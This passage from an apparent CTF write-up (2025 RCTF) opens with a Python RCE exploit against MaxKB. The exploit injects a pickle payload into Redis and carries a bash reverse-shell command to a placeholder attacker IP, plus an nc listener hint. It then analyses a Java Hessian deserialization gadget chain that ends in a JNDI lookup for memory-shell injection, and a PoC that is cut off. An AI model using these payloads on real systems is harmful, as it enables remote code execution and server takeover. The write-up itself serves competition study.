</span></span><span class=line><span class=cl>    <span class=n>redis_key</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;:TOKEN:</span><span class=si>{</span><span class=n>token</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Target Redis key will be: </span><span class=si>{</span><span class=n>redis_key</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>remote_code</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>def set_pickle_in_redis():
</span></span></span><span class=line><span class=cl><span class=s2>    import redis
</span></span></span><span class=line><span class=cl><span class=s2>    import base64
</span></span></span><span class=line><span class=cl><span class=s2>    
</span></span></span><span class=line><span class=cl><span class=s2>    try:
</span></span></span><span class=line><span class=cl><span class=s2>        r = redis.Redis(host=</span><span class=si>{</span><span class=n>redis_host</span><span class=si>!r}</span><span class=s2>, port=</span><span class=si>{</span><span class=n>redis_port</span><span class=si>}</span><span class=s2>, password=</span><span class=si>{</span><span class=n>redis_password</span><span class=si>!r}</span><span class=s2>, db=0)
</span></span></span><span class=line><span class=cl><span class=s2>        redis_key = </span><span class=si>{</span><span class=n>redis_key</span><span class=si>!r}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        b64_payload = </span><span class=si>{</span><span class=n>b64_payload</span><span class=si>!r}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        pickle_data = base64.b64decode(b64_payload)
</span></span></span><span class=line><span class=cl><span class=s2>        r.set(redis_key, pickle_data)
</span></span></span><span class=line><span class=cl><span class=s2>        return f&#34;OK: Successfully wrote </span><span class=se>{{</span><span class=s2>len(pickle_data)</span><span class=se>}}</span><span class=s2> bytes of pickle data to key &#39;</span><span class=se>{{</span><span class=s2>redis_key</span><span class=se>}}</span><span class=s2>&#39;.&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    except Exception as e:
</span></span></span><span class=line><span class=cl><span class=s2>        return f&#34;Redis Error: </span><span class=se>{{</span><span class=s2>e</span><span class=se>}}</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>set_pickle_in_redis() # &lt;-- FIX: Removed &#39;return&#39; from here
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Sending payload to remote server to inject into Redis...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>execute_python_code</span><span class=p>(</span><span class=n>remote_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute_system_command</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Execute system command using a robust method.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Using subprocess is generally better than os.system for capturing output</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>def run_cmd():
</span></span></span><span class=line><span class=cl><span class=s2>    import subprocess
</span></span></span><span class=line><span class=cl><span class=s2>    import shlex
</span></span></span><span class=line><span class=cl><span class=s2>    
</span></span></span><span class=line><span class=cl><span class=s2>    command = </span><span class=si>{</span><span class=n>cmd</span><span class=si>!r}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    try:
</span></span></span><span class=line><span class=cl><span class=s2>        # Use shlex.split for better argument handling
</span></span></span><span class=line><span class=cl><span class=s2>        args = shlex.split(command)
</span></span></span><span class=line><span class=cl><span class=s2>        result = subprocess.run(args, capture_output=True, text=True, timeout=10)
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        output = result.stdout if result.stdout else &#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        error = result.stderr if result.stderr else &#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        if output or error:
</span></span></span><span class=line><span class=cl><span class=s2>            return f&#34;STDOUT:</span><span class=se>\\</span><span class=s2>n</span><span class=se>{{</span><span class=s2>output</span><span class=se>}}\\</span><span class=s2>nSTDERR:</span><span class=se>\\</span><span class=s2>n</span><span class=se>{{</span><span class=s2>error</span><span class=se>}}</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        else:
</span></span></span><span class=line><span class=cl><span class=s2>            return &#34;Command executed with no output.&#34;
</span></span></span><span class=line><span class=cl><span class=s2>            
</span></span></span><span class=line><span class=cl><span class=s2>    except FileNotFoundError:
</span></span></span><span class=line><span class=cl><span class=s2>        return f&#34;Error: Command not found or path does not exist.&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    except Exception as e:
</span></span></span><span class=line><span class=cl><span class=s2>        return f&#34;Command execution failed: </span><span class=se>{{</span><span class=s2>e</span><span class=se>}}</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>run_cmd() # &lt;-- FIX: Removed &#39;return&#39; from here
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>execute_python_code</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Main exploitation function&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;MaxKB RCE Exploit - Complete Attack Chain&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Target: </span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 1: Login</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Step 1: Authentication&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>token</span> <span class=o>=</span> <span class=n>login</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>token</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Exploit failed - cannot login&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=c1># Optional Step: Test basic code execution</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] Testing basic code execution...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>test_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>def test():
</span></span></span><span class=line><span class=cl><span class=s2>    return &#34;RCE confirmed - Code execution successful!&#34;
</span></span></span><span class=line><span class=cl><span class=s2>test()
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span> <span class=c1># &lt;-- FIX: Removed &#39;return&#39; from here too</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>execute_python_code</span><span class=p>(</span><span class=n>test_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[Result] </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;RCE confirmed&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=nb>str</span><span class=p>(</span><span class=n>result</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Basic RCE test failed. Aborting.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># ==========================================================</span>
</span></span><span class=line><span class=cl>    <span class=c1># ========= 核心利用步骤：注入Pickle Payload到Redis =========</span>
</span></span><span class=line><span class=cl>    <span class=c1># ==========================================================</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Step 2: Injecting Pickle Payload into Redis for RCE&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Configure Redis connection info</span>
</span></span><span class=line><span class=cl>    <span class=n>redis_host</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>redis_port</span> <span class=o>=</span> <span class=mi>6379</span>
</span></span><span class=line><span class=cl>    <span class=n>redis_password</span> <span class=o>=</span> <span class=s2>&#34;Password123@redis&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Define the command you want to execute on the target server</span>
</span></span><span class=line><span class=cl>    <span class=n>command_to_execute</span> <span class=o>=</span> <span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/YOUR_ATTACKER_IP/YOUR_PORT 0&gt;&amp;1&#39;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Or for a simple test:</span>
</span></span><span class=line><span class=cl>    <span class=c1># command_to_execute = &#34;touch /tmp/pwned_by_pickle&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Call the injection function</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>inject_pickle_payload</span><span class=p>(</span><span class=n>redis_host</span><span class=p>,</span> <span class=n>redis_port</span><span class=p>,</span> <span class=n>redis_password</span><span class=p>,</span> <span class=n>token</span><span class=p>,</span> <span class=n>command_to_execute</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[Injection Result] </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;OK:&#34;</span> <span class=ow>in</span> <span class=nb>str</span><span class=p>(</span><span class=n>result</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Pickle payload injected successfully!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] The next time the application deserializes this token from Redis,&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] the command &#39;</span><span class=si>{</span><span class=n>command_to_execute</span><span class=si>}</span><span class=s2>&#39; should be executed on the server.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] You may need to trigger this by making another authenticated request or simply waiting.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] If using a reverse shell, make sure your listener (e.g., &#39;nc -lvnp YOUR_PORT&#39;) is running.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[-] Failed to inject pickle payload.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] You can now try to verify if the command was executed (if you used a non-interactive command).&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] For example, checking if the file &#39;/tmp/pwned_by_pickle&#39; exists:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>verification_result</span> <span class=o>=</span> <span class=n>execute_system_command</span><span class=p>(</span><span class=s2>&#34;ls -l /tmp/pwned_by_pickle&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[Verification Result]</span><span class=se>\n</span><span class=si>{</span><span class=n>verification_result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] EXPLOIT FINISHED&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=maybe_easy>maybe_easy</h2><p>经典JAVA 反序列化题目，复习一下<a href=https://su18.org/post/hessian/>SU18 巨佬文章</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;com.rctf.server.tool.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;java.util.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;org.apache.commons.logging.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;org.springframework.beans.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>WHITE_PACKAGES</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=s>&#34;org.springframework.jndi.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>观察发现白名单跟<code>Spring AOP</code> 和 <code>Spring Context & AOP</code> 两条链子关系很大，最后极有可能打的是JNDI</p><img src=/img/2025-RCTF/6.png alt=img width=50%><p>给了个chain 类存在compareTo方法，那么kick-off入口类也就确定了是TreeMap，TreeMap可以触发compareTo</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=c1>//</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// Source code recreated from a .class file by IntelliJ IDEA</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// (powered by FernFlower decompiler)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>package</span><span class=w> </span><span class=nn>com.rctf.server.tool</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.Serializable</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.InvocationHandler</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Method</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Proxy</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Maybe</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>Proxy</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>Comparable</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>Serializable</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Maybe</span><span class=p>(</span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>h</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>(</span><span class=n>h</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>compareTo</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Method</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Comparable</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;compareTo&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Object</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>h</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=n>o</span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>Integer</span><span class=p>)</span><span class=n>result</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Throwable</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>在idea 里面扒一扒继承InvocationHandler 接口且在白名单的类有哪些，只有这三个</p><p><img src=/img/2025-RCTF/7.png alt=img></p><p>EarlySingletonInvocationHandler 类看着没啥用</p><p><img src=/img/2025-RCTF/8.png alt=img></p><p>ServiceLocatorInvocationHandler 类最后会触发<code>args[0]</code>的toString 方法，利用难度太大</p><p><img src=/img/2025-RCTF/9.png alt=img></p><p><img src=/img/2025-RCTF/10.png alt=img></p><p><img src=/img/2025-RCTF/11.png alt=img></p><p>参考Spring1 链子易知ObjectFactoryDelegatingInvocationHandler可以自定义的ObjectFactory 类触发 getObject 方法</p><p><img src=/img/2025-RCTF/12.png alt=img></p><p>翻了一下找到了TargetBeanObjectFactory 这个类，恰巧SimpleJndiBeanFactory 这个类继承自BeanFactory 接口，其中的getBean 方法会触发lookup ，一切就大功告成了</p><p><img src=/img/2025-RCTF/13.png alt=img></p><p><img src=/img/2025-RCTF/14.png alt=img></p><p><img src=/img/2025-RCTF/15.png alt=img></p><img src=/img/2025-RCTF/16.png alt=img width=50%><p>PoC如下，用java-chains 打 JNDI 二次反序列化注入内存马即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.Hessian2Input</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.Hessian2Output</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.SerializerFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.logging.impl.NoOpLog</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.example.tool.HessianFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.target.HotSwappableTargetSource</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.jndi.support.SimpleJndiBeanFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.scheduling.annotation.AsyncAnnotationAdvisor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.rctf.server.tool.Maybe</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.beans.factory.BeanFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.beans.factory.ObjectFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.jndi.support.SimpleJndiBeanFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.InvocationHandler</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Proxy</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>PoC1</span><span class=w> </span><span class=p>{</span><span class=w>
